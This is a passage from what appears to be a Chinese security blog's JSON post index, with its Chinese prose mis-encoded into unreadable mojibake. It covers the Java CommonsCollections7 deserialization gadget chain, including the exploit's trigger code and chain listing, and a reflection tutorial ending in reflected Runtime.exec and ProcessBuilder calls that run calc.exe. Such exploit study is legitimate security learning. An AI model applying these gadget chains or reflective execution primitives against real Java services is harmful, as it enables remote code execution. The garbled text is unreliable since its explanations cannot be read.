FileOutputStream(\u0026#34;cc7.out\u0026#34;)); objectOutputStream.writeObject(hashtable); objectOutputStream.close(); ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream(\u0026#34;cc7.out\u0026#34;)); objectInputStream.readObject(); } } Expæ„é€ åˆ†æ åˆ©ç”¨é“¾å±•ç¤º 1 2 3 4 5 Hashtable.readObject()/Hashtable.reconstitutionPut() TiedMapEntry.hashCode()/TiedMapEntry.getValue() LazyMap.get() ChainedTransformer.transform() InvokerTransformer.transform() Hashtable 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 private void reconstitutionPut(Entry\u0026lt;?,?\u0026gt;[] tab, K key, V value) throws StreamCorruptedException { if (value == null) { throw new java.io.StreamCorruptedException(); } // Makes sure the key is not already in the hashtable. // This should not happen in deserialized version. int hash = key.hashCode();//2 int index = (hash \u0026amp; 0x7FFFFFFF) % tab.length; for (Entry\u0026lt;?,?\u0026gt; e = tab[index] ; e != null ; e = e.next) { if ((e.hash == hash) \u0026amp;\u0026amp; e.key.equals(key)) { throw new java.io.StreamCorruptedException(); } } // Creates the new entry. @SuppressWarnings(\u0026#34;unchecked\u0026#34;) Entry\u0026lt;K,V\u0026gt; e = (Entry\u0026lt;K,V\u0026gt;)tab[index]; tab[index] = new Entry\u0026lt;\u0026gt;(hash, key, value, e); count++; } private void readObject(java.io.ObjectInputStream s) throws IOException, ClassNotFoundException { // Read in the threshold and loadFactor s.defaultReadObject(); // Validate loadFactor (ignore threshold - it will be re-computed) if (loadFactor \u0026lt;= 0 || Float.isNaN(loadFactor)) throw new StreamCorruptedException(\u0026#34;Illegal Load: \u0026#34; + loadFactor); // Read the original length of the array and number of elements int origlength = s.readInt(); int elements = s.readInt(); // Validate # of elements if (elements \u0026lt; 0) throw new StreamCorruptedException(\u0026#34;Illegal # of Elements: \u0026#34; + elements); // Clamp original length to be more than elements / loadFactor // (this is the invariant enforced with auto-growth) origlength = Math.max(origlength, (int)(elements / loadFactor) + 1); // Compute new length with a bit of room 5% + 3 to grow but // no larger than the clamped original length. Make the length // odd if it\u0026#39;s large enough, this helps distribute the entries. // Guard against the length ending up zero, that\u0026#39;s not valid. int length = (int)((elements + elements / 20) / loadFactor) + 3; if (length \u0026gt; elements \u0026amp;\u0026amp; (length \u0026amp; 1) == 0) length--; length = Math.min(length, origlength); if (length \u0026lt; 0) { // overflow length = origlength; } // Check Map.Entry[].class since it\u0026#39;s the nearest public type to // what we\u0026#39;re actually creating. SharedSecrets.getJavaOISAccess().checkArray(s, Map.Entry[].class, length); table = new Entry\u0026lt;?,?\u0026gt;[length]; threshold = (int)Math.min(length * loadFactor, MAX_ARRAY_SIZE + 1); count = 0; // Read the number of elements and then all the key/value objects for (; elements \u0026gt; 0; elements--) { @SuppressWarnings(\u0026#34;unchecked\u0026#34;) K key = (K)s.readObject(); @SuppressWarnings(\u0026#34;unchecked\u0026#34;) V value = (V)s.readObject(); // sync is eliminated for performance reconstitutionPut(table, key, value); //1 } } CommonsCollections7å’Œ6çš„åŒºåˆ«ä¸»è¦æ˜¯ä½¿ç”¨äº†Hashtableï¼Œä»£ç å…³é”®åœ¨äºæ³¨é‡Š1å’Œ2å¤„ã€‚\n","date":"2024-09-04T01:24:26+08:00","image":"https://lantern-1313649837.cos.ap-beijing.myqcloud.com/image/20241123190803.jpg","permalink":"https://lantern-lab.github.io/post/java-derivativeization-zj7e3h.html","title":"ã€Javaååºåˆ—åŒ–ã€‘CommonsCollectionsé“¾"},{"content":"Javaåå°„ å‚è€ƒæ–‡ç« ï¼š\nJAVAååºåˆ—åŒ– - åå°„æœºåˆ¶\nJavaåå°„ï¼ˆè¶…è¯¦ç»†ï¼ï¼‰\nJavaåå°„ï¼ˆç®€å•è¯¦ç»†ä¸”æ˜“æ‡‚ï¼Œå¿«é€Ÿå…¥é—¨ï¼‰\n0 å‡†å¤‡ä¸€ä¸ªUserç±» 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 package org.example.reflect; public class User { public String name; private int age; public User(){} private User(String name){ this.name = name; } public User(String name, int age){ this.name = name; this.age = age; } private void testPrivate(String name, int age){ System.out.println(\u0026#34;è¿™æ˜¯ä¸€ä¸ªç”¨æ¥æµ‹è¯•çš„ç§æœ‰æ–¹æ³•ã€‚User [name=\\\u0026#34;+ name +\\\u0026#34;, age=\\\u0026#34;+age+\\\u0026#34;]\u0026#34;); } public void testPublic(String name, int age) { System.out.println(\u0026#34;è¿™æ˜¯ä¸€ä¸ªç”¨æ¥æµ‹è¯•çš„å…¬æœ‰æ–¹æ³•ã€‚User [name=\\\u0026#34;+ name +\\\u0026#34;, age=\\\u0026#34;+age+\\\u0026#34;]\u0026#34;); } public String toString(){ return \u0026#34;User [name=\u0026#34;+ name +\u0026#34;, age=\u0026#34;+age+\u0026#34;]\u0026#34;; } } 1 åå°„ç›¸å…³ç±» ç±» å«ä¹‰ java.lang.Class ä»£è¡¨æ•´ä¸ªå­—èŠ‚ç ï¼›ä»£è¡¨ä¸€ä¸ªç±»å‹ï¼Œä»£è¡¨æ•´ä¸ªç±» java.lang.reflect.Constructor ä»£è¡¨å­—èŠ‚ç ä¸­çš„æ„é€ æ–¹æ³•å­—èŠ‚ç ï¼›ä»£è¡¨ç±»ä¸­çš„æ„é€ æ–¹æ³• java.lang.reflect.Field ä»£è¡¨å­—èŠ‚ç ä¸­çš„å±æ€§å­—èŠ‚ç ï¼›ä»£è¡¨ç±»ä¸­çš„æˆå‘˜å˜é‡ï¼ˆé™æ€å˜é‡+å®ä¾‹å˜é‡ï¼‰ java.lang.reflect.Method ä»£è¡¨å­—èŠ‚ç ä¸­çš„æ–¹æ³•å­—èŠ‚ç ï¼›ä»£è¡¨ç±»ä¸­çš„æ–¹æ³• é€šå¸¸æ˜¯å…ˆè·å–Classç±»ï¼Œå†é€šè¿‡Classç±»çš„æ–¹æ³•è·å–Methodç±»ã€Constructorç±»æˆ–Fieldç±»\n2 è·å–Classç±» Class.forName(\u0026ldquo;ç±»çš„é™æ€è·¯å¾„\u0026rdquo;) ç±»å.Class å¯¹è±¡å.getClass() 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 package org.example.reflect; public class ReflectTest01 { public static void main(String[] args) throws InstantiationException, IllegalAccessException, ClassNotFoundException { Class\u0026lt;?\u0026gt; c1 = Class.forName(\u0026#34;org.example.reflect.User\u0026#34;); //å¦‚æœæ— å‚æ„é€ å‡½æ•°æ˜¯private,åˆ™æ— æ³•ä½¿ç”¨newInstanceæ–¹æ³• //Object o1 = c1.newInstance(); System.out.println(c1.getName()); Class\u0026lt;?\u0026gt; c2 = User.class; //Object o2 = c2.newInstance(); System.out.println(c2.getName()); User user = new User(\u0026#34;zhangsan\u0026#34;,18); Class\u0026lt;? extends User\u0026gt; c3 = user.getClass(); Object o3 = c3.newInstance(); System.out.println(o3); } } è·å–åˆ°Classç±»åï¼Œå¯ä»¥é€šè¿‡å¦‚ä¸‹æ–¹æ³•è·å–å¯¹åº”çš„æ„é€ å‡½æ•°ã€æˆå‘˜æ–¹æ³•æˆ–è€…æˆå‘˜å˜é‡æ‰è¿›è¡Œå…¶å®ƒæ“ä½œ\né€šè¿‡Classè·å–Constructor æ–¹æ³• å«ä¹‰ public Constructor getConstructor(Class\u003c?\u003e\u0026hellip; parameterTypes) è·å–å…¬å¼€çš„æ„é€ æ–¹æ³• public Constructor\u003c?\u003e[] getConstructors() è·å–æ‰€æœ‰çš„å…¬å¼€çš„æ„é€ æ–¹æ³• public Constructor getDeclaredConstructor(Class\u003c?\u003e\u0026hellip; parameterTypes) è·å–æŒ‡å®šåŒ…æ‹¬ç§æœ‰,ä¸åŒ…æ‹¬ç»§æ‰¿çš„Constructorå¯¹è±¡ public Constructor\u003c?\u003e[] getDeclaredConstructors() è·å–æ‰€æœ‰çš„æ„é€ æ–¹æ³•,åŒ…æ‹¬ç§æœ‰ é€šè¿‡Classè·å–Field æ–¹æ³• å«ä¹‰ public Field getField(String name) è·å–æŒ‡å®šå…¬å…±å±æ€§çš„Fieldå¯¹è±¡ public Field[] getFields() è·å–æ‰€æœ‰å…¬å¼€çš„æˆå‘˜å˜é‡,åŒ…æ‹¬ç»§æ‰¿å˜é‡ public Field getDeclaredField(String name) è·å–æŒ‡å®šåŒ…æ‹¬ç§æœ‰,ä¸åŒ…æ‹¬ç»§æ‰¿çš„Fieldå¯¹è±¡ public Field[] getDeclaredFields() è·å–æœ¬ç±»å®šä¹‰çš„æˆå‘˜å˜é‡,åŒ…æ‹¬ç§æœ‰,ä½†ä¸åŒ…æ‹¬ç»§æ‰¿çš„å˜é‡ é€šè¿‡Classè·å–Method æ–¹æ³• å«ä¹‰ public Method getMethod(String name, Class\u003c?\u003e\u0026hellip; parameterTypes) è·å–æŒ‡å®šæ–¹æ³•çš„Methodå¯¹è±¡ public Method[] getMethods() è·å–æ‰€æœ‰å¯è§çš„æ–¹æ³•,åŒ…æ‹¬ç»§æ‰¿çš„æ–¹æ³• public Method getDeclaredMethod(String name, Class\u003c?\u003e\u0026hellip; parameterTypes) è·å–æŒ‡å®šåŒ…æ‹¬ç§æœ‰,ä¸åŒ…æ‹¬ç»§æ‰¿çš„Methodå¯¹è±¡ public Method[] getDeclaredMethods() è·å–æœ¬ç±»å®šä¹‰çš„çš„æ–¹æ³•,åŒ…æ‹¬ç§æœ‰,ä¸åŒ…æ‹¬ç»§æ‰¿çš„æ–¹æ³• 3 è·å–Constructor 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 package org.example.reflect; import java.lang.reflect.Constructor; import java.lang.reflect.InvocationTargetException; public class ReflectTest02 { public static void main(String[] args) { Class\u0026lt;?\u0026gt; userClass = User.class; //æµ‹è¯•getConstructors()å‡½æ•° Constructor\u0026lt;?\u0026gt;[] constructors = userClass.getConstructors(); System.out.println(\u0026#34;\\né€šè¿‡getConstructors()è·å–æ‰€æœ‰å…¬å¼€æ„é€ æ–¹æ³•\u0026#34;); for (Constructor\u0026lt;?\u0026gt; con : constructors) { System.out.println(\u0026#34;æ„é€ æ–¹æ³•åç§°ä¸ºï¼š\u0026#34; + con.getName()); Class\u0026lt;?\u0026gt;[] paramList = con.getParameterTypes(); System.out.println(\u0026#34;å‚æ•°æ•°é‡ä¸ºï¼š\u0026#34; + paramList.length); System.out.println(\u0026#34;å½¢å‚ç±»å‹ä¸ºï¼š\u0026#34;); for (Class\u0026lt;?\u0026gt; p : paramList) { System.out.println(p); } } System.out.println();//æ¢è¡Œ //æµ‹è¯•getDeclaredConstructors()å‡½æ•° Constructor\u0026lt;?\u0026gt;[] DeclaredConstructors = userClass.getDeclaredConstructors(); System.out.println(\u0026#34;\\né€šè¿‡getDeclaredConstructors()è·å–æ‰€æœ‰æ„é€ æ–¹æ³•(åŒ…æ‹¬ç§æœ‰,åŒ…æ‹¬ç»§æ‰¿)\u0026#34;); for (Constructor\u0026lt;?\u0026gt; con : DeclaredConstructors) { System.out.println(\u0026#34;æ„é€ æ–¹æ³•åç§°ä¸ºï¼š\u0026#34; + con.getName()); Class\u0026lt;?\u0026gt;[] paramList = con.getParameterTypes(); System.out.println(\u0026#34;å‚æ•°æ•°é‡ä¸ºï¼š\u0026#34; + paramList.length); System.out.println(\u0026#34;å½¢å‚ç±»å‹ä¸ºï¼š\u0026#34;); for (Class\u0026lt;?\u0026gt; p : paramList) { System.out.println(p); } } //æµ‹è¯•getConstructor()å‡½æ•° try { Constructor\u0026lt;?\u0026gt; constructor = userClass.getConstructor(String.class, int.class); Object o = constructor.newInstance(\u0026#34;Alice\u0026#34;,18); System.out.println(\u0026#34;\\næ„é€ çš„å¯¹è±¡ä¸ºï¼š\u0026#34; + o); } catch (NoSuchMethodException | InvocationTargetException | InstantiationException | IllegalAccessException e) { throw new RuntimeException(e); } } } 4 è·å–Field â€\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 package org.example.reflect; import java.lang.reflect.Field; public class ReflectTest03 { public static void main(String[] args) throws InstantiationException, IllegalAccessException { Class\u0026lt;User\u0026gt; userClass = User.class; Object o = userClass.newInstance(); //æµ‹è¯•getFields()å‡½æ•° Field []studentFields = userClass.getFields(); System.out.println(\u0026#34;\\né€šè¿‡getFieldsè·å–Studentç±»æ‰€æœ‰å…¬å¼€å±æ€§\u0026#34;); for (Field field:studentFields) { System.out.println(\u0026#34;å±æ€§çš„ç±»å‹ä¸ºï¼š\u0026#34;+field.getType()+\u0026#34;å±æ€§çš„åç§°ä¸ºï¼š\u0026#34;+field.getName()); } //æµ‹è¯•getDeclaredFields()å‡½æ•° Field []studentDeclaredFields = userClass.getDeclaredFields(); System.out.println(\u0026#34;\\né€šè¿‡getDeclaredFieldsè·å–Studentç±»æ‰€æœ‰å±æ€§(åŒ…æ‹¬ç§æœ‰,ä¸åŒ…æ‹¬ç»§æ‰¿)\u0026#34;); for (Field field :studentDeclaredFields) { System.out.println(\u0026#34;å±æ€§çš„ç±»å‹ä¸ºï¼š\u0026#34;+field.getType()+\u0026#34;\\tå±æ€§çš„åç§°ä¸ºï¼š\u0026#34;+field.getName()); } //æµ‹è¯•getField(String)å‡½æ•° try { Field field = userClass.getField(\u0026#34;name\u0026#34;); System.out.println(\u0026#34;\\né€šè¿‡getField(\\\u0026#34;name\\\u0026#34;)è·å–å…¬å¼€å±æ€§name\u0026#34;); System.out.println(\u0026#34;å±æ€§çš„ç±»å‹ä¸ºï¼š\u0026#34;+field.getType()+\u0026#34;\\tå±æ€§çš„åç§°ä¸ºï¼š\u0026#34;+field.getName()); field.set(o,\u0026#34;Bob\u0026#34;); System.out.println(o); } catch (NoSuchFieldException e) { throw new RuntimeException(e); } //æµ‹è¯•getDeclaredField(String)å‡½æ•° try { Field declaredFiled = userClass.getDeclaredField(\u0026#34;age\u0026#34;); System.out.println(\u0026#34;\\né€šè¿‡getDeclaredField(\\\u0026#34;age\\\u0026#34;)è·å–ç§æœ‰å±æ€§age\u0026#34;); System.out.println(\u0026#34;å±æ€§çš„ç±»å‹ä¸ºï¼š\u0026#34;+declaredFiled.getType()+\u0026#34;\\tå±æ€§çš„åç§°ä¸ºï¼š\u0026#34;+declaredFiled.getName()); declaredFiled.setAccessible(true);//ä¸ºäº†å¯ä»¥è®¿é—®ç§æœ‰æˆå‘˜å˜é‡ï¼Œæˆ‘ä»¬éœ€è¦å¼ºåˆ¶è®¾ç½®è®¿é—®æƒé™ã€‚ declaredFiled.set(o, 18); System.out.println(declaredFiled.get(o)); } catch (NoSuchFieldException e) { throw new RuntimeException(e); } } } 5 è·å–Method 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 package org.example.reflect; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method; public class ReflectTest04 { public static void main(String[] args) throws NoSuchMethodException, InstantiationException, IllegalAccessException { Class\u0026lt;User\u0026gt; userClass = User.class; Object o = userClass.newInstance(); //æµ‹è¯•getMethods()å‡½æ•° Method[] methods = userClass.getMethods(); System.out.println(\u0026#34;\\né€šè¿‡getMethods()è·å–æ‰€æœ‰å…¬å¼€æ–¹æ³•\u0026#34;); for (Method method : methods) { System.out.println(method.getName()); Class\u0026lt;?\u0026gt;[] paramList = method.getParameterTypes(); System.out.println(\u0026#34;å‚æ•°æ•°é‡ä¸ºï¼š\u0026#34; + paramList.length); for (Class\u0026lt;?\u0026gt; p : paramList) { System.out.println(\u0026#34;å‚æ•°ç±»å‹ä¸º:\u0026#34; + p.getTypeName()); } } //æµ‹è¯•getDeclaredMethods()å‡½æ•° Method[] declaredMethods = userClass.getDeclaredMethods(); System.out.println(\u0026#34;\\né€šè¿‡getdeclaredMethods()è·å–æ‰€æœ‰æ–¹æ³•(åŒ…æ‹¬ç§æœ‰,ä¸åŒ…æ‹¬ç»§æ‰¿)\u0026#34;); for (Method method : declaredMethods) { System.out.println(method.getName()); Class\u0026lt;?\u0026gt;[] paramList = method.getParameterTypes(); System.out.println(\u0026#34;å‚æ•°æ•°é‡ä¸ºï¼š\u0026#34; + paramList.length); for (Class\u0026lt;?\u0026gt; p : paramList) { System.out.println(\u0026#34;å‚æ•°ç±»å‹ä¸º:\u0026#34; + p.getTypeName()); } } //æµ‹è¯•getMethod(å‚æ•°)å‡½æ•° Method method = userClass.getMethod(\u0026#34;testPublic\u0026#34;, String.class, int.class); System.out.println(\u0026#34;\\né€šè¿‡getMethodè·å–testPublic\u0026#34;); System.out.println(method.getName()); try { method.invoke(o, \u0026#34;Alice\u0026#34;, 18); } catch (InvocationTargetException e) { throw new RuntimeException(e); } Class\u0026lt;?\u0026gt;[] paramList = method.getParameterTypes(); System.out.println(\u0026#34;å‚æ•°æ•°é‡ä¸ºï¼š\u0026#34; + paramList.length); for (Class\u0026lt;?\u0026gt; p : paramList) { System.out.println(\u0026#34;å‚æ•°ç±»å‹ä¸º:\u0026#34; + p.getTypeName()); } //æµ‹è¯•getDeclaredMethod(å‚æ•°)å‡½æ•° Method declaredMethod = userClass.getDeclaredMethod(\u0026#34;testPrivate\u0026#34;, String.class, int.class); System.out.println(\u0026#34;\\né€šè¿‡getDeclaredMethodè·å–testPrivateæ–¹æ³•\u0026#34;); System.out.println(declaredMethod.getName()); try { declaredMethod.setAccessible(true); declaredMethod.invoke(o, \u0026#34;Bob\u0026#34;, 20); } catch (InvocationTargetException e) { throw new RuntimeException(e); } Class\u0026lt;?\u0026gt;[] pls = declaredMethod.getParameterTypes(); System.out.println(\u0026#34;å‚æ•°æ•°é‡ä¸ºï¼š\u0026#34; + pls.length); for (Class\u0026lt;?\u0026gt; p : pls) { System.out.println(\u0026#34;å‚æ•°ç±»å‹ä¸º:\u0026#34; + p.getTypeName()); } } } 6 ä¾‹å­ ä¾‹ä¸€ â€‹Runtime.getRuntime().exec(\u0026quot;calc.exe\u0026quot;);â€‹\n1 2 3 4 5 6 7 8 9 Class.forName(\u0026#34;java.lang.Runtime\u0026#34;) .getMethod(\u0026#34;exec\u0026#34;, String.class) .invoke( Class.forName(\u0026#34;java.lang.Runtime\u0026#34;) .getMethod(\u0026#34;getRuntime\u0026#34;) .invoke(Class.forName(\u0026#34;java.lang.Runtime\u0026#34;))//æ­¤å¤„åœ¨è·å–ç±» , \u0026#34;calc.exe\u0026#34; ); â€‹public Object invoke(Object obj, Object... args)â€‹\nå®ƒçš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯æ‰§è¡Œmethodçš„å¯¹è±¡ï¼š\nå¦‚æœè¿™ä¸ªæ–¹æ³•æ˜¯ä¸€ä¸ªæ™®é€šæ–¹æ³•ï¼Œé‚£ä¹ˆç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ç±»å¯¹è±¡ å¦‚æœè¿™ä¸ªæ–¹æ³•æ˜¯ä¸€ä¸ªé™æ€æ–¹æ³•ï¼Œé‚£ä¹ˆç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ç±» ä¾‹äºŒ 1 2 3 4 List\u0026lt;String\u0026gt; paramList = new ArrayList\u0026lt;\u0026gt;(); paramList.add(\u0026#34;calc.exe\u0026#34;); ProcessBuilder pb = new ProcessBuilder(paramList); pb.start(); ProcessBuilderæœ‰ä¸¤ä¸ªæ„é€ å‡½æ•°\nâ€‹public ProcessBuilder(List\u0026lt;String\u0026gt; command)â€‹ â€‹public ProcessBuilder(String... command)â€‹ æ ¹æ®è¿™ä¸¤ä¸ªæ„é€ å‡½æ•°ï¼Œæœ‰ä¸¤ä¸ªååºåˆ—åŒ–çš„æ„é€ \n1 2 3 4 5 6 7 Class.forName(\u0026#34;java.lang.ProcessBuilder\u0026#34;) .getMethod(\u0026#34;start\u0026#34;) .invoke( Class.forName(\u0026#34;java.lang.ProcessBuilder\u0026#34;) .getConstructor(List.class) .newInstance(Arrays.asList(\u0026#34;calc.exe\u0026#34;)) ); 1 2 3 4 ((ProcessBuilder)Class.forName(\u0026#34;java.lang.ProcessBuilder\u0026#34;) .getConstructor(String[].class) .newInstance(new String[][]{{\u0026#34;calc.exe\u0026#34;}})) .start(); newInstanceå‡½æ•°æ¥å—å‚æ•°æ˜¯ä¸€ä¸ªObject..â€‹ä¹Ÿå°±æ˜¯Objectæ•°ç»„ï¼Œå®ƒä¼šç»™String[][]å»æ‰ä¸€å±‚ã€‚å‰©ä¸‹çš„String[]åŒ¹é…ProcessBuilderå˜é‡æ ¼å¼ã€‚\n","date":"2024-07-18T10:32:05+08:00","image":"https://lantern-1313649837.cos.ap-beijing.myqcloud.com/image/20241123185908.jpg","permalink":"https://lantern-lab.github.io/post/java-reflection-1ypwc3.html","title":"Javaåå°„"}]